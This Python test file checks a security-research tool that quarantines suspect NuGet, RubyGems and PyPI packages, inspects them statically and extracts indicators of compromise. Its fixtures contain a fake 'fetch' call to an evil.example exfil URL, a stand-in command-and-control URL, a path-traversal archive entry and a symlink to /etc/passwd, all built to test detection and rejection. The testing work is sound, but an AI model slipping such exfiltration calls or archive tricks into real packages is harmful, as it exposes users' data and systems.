import gzip
import io
import json
import stat
import tarfile
import zipfile

import soc_store
from secopsai.research_artifact_analysis import compare_artifacts, extract_ioc_candidates, inspect_artifact, review_ioc_candidate
from secopsai.research_artifacts import attach_to_case, import_artifact, verify_artifact
from secopsai.research_cases import add_subject, create_case, update_subject_state
from secopsai.research_acquisition import create_partner_request, update_partner_request

PROVENANCE = {"source": "test-fixture"}


def _package(path, url):
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("lib/netstandard2.0/Demo.dll", f"{url} 198.51.100.10".encode())
        archive.writestr("tools/install.ps1", "Write-Host test")


def test_local_artifact_analysis_and_ioc_review(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    left_path = tmp_path / "left.nupkg"
    right_path = tmp_path / "right.nupkg"
    _package(left_path, "https://evil.example/one")
    _package(right_path, "https://evil.example/two")
    case = create_case(title="Artifact case", summary="test", case_type="malicious_package", severity="medium", confidence=50, owner="test", db_path=db)
    left = import_artifact(str(left_path), ecosystem="nuget", package_name="Demo", version="1.0", provenance=PROVENANCE, db_path=db)
    right = import_artifact(str(right_path), ecosystem="nuget", package_name="Demo", version="2.0", provenance=PROVENANCE, db_path=db)
    attach_to_case(case["case_id"], left["artifact_id"], db_path=db)
    attach_to_case(case["case_id"], right["artifact_id"], db_path=db)
    result = inspect_artifact(left["artifact_id"], db_path=db)
    assert result["execution_performed"] is False
    assert result["lifecycle_scripts"]
    comparison = compare_artifacts(left["artifact_id"], right["artifact_id"], db_path=db)
    assert comparison["changed_members"]
    extracted = extract_ioc_candidates(case["case_id"], db_path=db)
    assert extracted["candidates"]
    candidate = extracted["candidates"][0]
    assert review_ioc_candidate(candidate["candidate_id"], decision="approved", db_path=db)["status"] == "approved"
    with soc_store.connect(db) as connection:
        assert connection.execute("SELECT COUNT(*) FROM research_iocs WHERE case_id = ?", (case["case_id"],)).fetchone()[0] == 1


def test_archive_traversal_is_rejected(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "unsafe.nupkg"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("../escape.txt", "no")
    try:
        import_artifact(str(path), ecosystem="nuget", provenance=PROVENANCE, db_path=db)
    except ValueError as exc:
        assert "traversal" in str(exc)
    else:
        raise AssertionError("unsafe archive was accepted")


def test_subject_lifecycle_and_partner_request_are_separate(tmp_path):
    db = str(tmp_path / "soc.db")
    case = create_case(title="Lifecycle", summary="test", case_type="typosquatting", severity="high", confidence=50, owner="test", db_path=db)
    case = add_subject(case["case_id"], subject_type="package", ecosystem="nuget", name="Example", version="1.0", db_path=db)
    subject_id = case["subjects"][0]["subject_id"]
    updated = update_subject_state(subject_id, registry_state="removed", artifact_state="externally_supplied", validation_state="static_confirmed", reason="Official registry no longer serves the version", db_path=db)
    subject = next(item for item in updated["subjects"] if item["subject_id"] == subject_id)
    assert subject["status"] == "active"
    assert subject["registry_state"] == "removed"
    request = create_partner_request(updated["case_id"], recipient="research@example.org", reason="Request exact artifact", subject_id=subject_id, db_path=db)
    assert update_partner_request(request["request_id"], status="approved", db_path=db)["status"] == "approved"


def _gem(path, url):
    inner = io.BytesIO()
    with tarfile.open(fileobj=inner, mode="w") as inner_tar:
        payload = f"require 'net/http'\n# {url}".encode()
        info = tarfile.TarInfo("lib/demo.rb")
        info.size = len(payload)
        inner_tar.addfile(info, io.BytesIO(payload))
    compressed = gzip.compress(inner.getvalue())
    with tarfile.open(path, "w") as outer_tar:
        info = tarfile.TarInfo("data.tar.gz")
        info.size = len(compressed)
        outer_tar.addfile(info, io.BytesIO(compressed))


def test_gem_tar_artifact_imports_and_inspects(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    gem_path = tmp_path / "demo-1.0.gem"
    _gem(gem_path, "https://evil.example/gem-c2")
    artifact = import_artifact(str(gem_path), ecosystem="rubygems", package_name="demo", version="1.0", provenance=PROVENANCE, db_path=db)
    assert artifact["archive"]["format"] == "tar"
    result = inspect_artifact(artifact["artifact_id"], db_path=db)
    assert result["execution_performed"] is False
    assert result["archive_format"] == "tar"
    assert any("evil.example" in value for value in result["urls"])


def test_zip_symlink_entry_is_rejected(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "linked.nupkg"
    with zipfile.ZipFile(path, "w") as archive:
        info = zipfile.ZipInfo("tools/link")
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, "/etc/passwd")
    try:
        import_artifact(str(path), ecosystem="nuget", provenance=PROVENANCE, db_path=db)
    except ValueError as exc:
        assert "symlink" in str(exc)
    else:
        raise AssertionError("symlink archive was accepted")


def test_provenance_is_required(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "plain.nupkg"
    _package(path, "https://evil.example/one")
    try:
        import_artifact(str(path), ecosystem="nuget", db_path=db)
    except ValueError as exc:
        assert "provenance" in str(exc)
    else:
        raise AssertionError("artifact without provenance was accepted")


def test_verify_preserves_purged_state(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "keep.nupkg"
    _package(path, "https://evil.example/one")
    artifact = import_artifact(str(path), ecosystem="nuget", provenance=PROVENANCE, db_path=db)
    with soc_store.connect(db) as connection:
        connection.execute("UPDATE research_artifacts SET state = 'purged' WHERE artifact_id = ?", (artifact["artifact_id"],))
        connection.commit()
    assert verify_artifact(artifact["artifact_id"], db_path=db)["state"] == "purged"


def test_attach_role_is_validated(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "role.nupkg"
    _package(path, "https://evil.example/one")
    artifact = import_artifact(str(path), ecosystem="nuget", provenance=PROVENANCE, db_path=db)
    case = create_case(title="Roles", summary="test", case_type="malicious_package", severity="low", confidence=50, owner="test", db_path=db)
    try:
        attach_to_case(case["case_id"], artifact["artifact_id"], role="bogus", db_path=db)
    except ValueError as exc:
        assert "role" in str(exc)
    else:
        raise AssertionError("invalid attachment role was accepted")


def test_benign_registry_urls_are_not_ioc_candidates(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    path = tmp_path / "mixed.nupkg"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("readme.txt", "docs https://pypi.org/project/demo mirror https://evil.example/exfil")
        archive.writestr("src/index.js", 'fetch("https://evil.example/exfil");')
    artifact = import_artifact(str(path), ecosystem="pypi", provenance=PROVENANCE, db_path=db)
    case = create_case(title="Noise", summary="test", case_type="malicious_package", severity="low", confidence=50, owner="test", db_path=db)
    attach_to_case(case["case_id"], artifact["artifact_id"], db_path=db)
    extracted = extract_ioc_candidates(case["case_id"], db_path=db)
    url_candidates = [item["value"] for item in extracted["candidates"] if item["ioc_type"] == "url"]
    assert url_candidates == ["https://evil.example/exfil"]


def test_analyzer_accepts_digest_pinned_image(tmp_path, monkeypatch):
    from secopsai import research_analysis

    calls = []

    class _Result:
        returncode = 0
        stdout = json.dumps({"tool": "fake-analyzer", "tool_version": "1", "execution_performed": False})
        stderr = ""

    def _fake_run(cmd, **kwargs):
        calls.append(cmd)
        return _Result()

    digest_image = "registry.example/secopsai/nuget-analyzer@sha256:" + "a" * 64
    monkeypatch.setenv("SECOPSAI_NUGET_ANALYZER_IMAGE", digest_image)
    monkeypatch.setattr(research_analysis.subprocess, "run", _fake_run)
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("lib/netstandard2.0/Demo.dll", b"MZ fake assembly bytes")
    result = research_analysis.inspect_nuget_archive(buffer.getvalue(), "demo.nupkg")
    assert result["dotnet"]["decompiler_available"] is True
    assert calls and digest_image in calls[0]
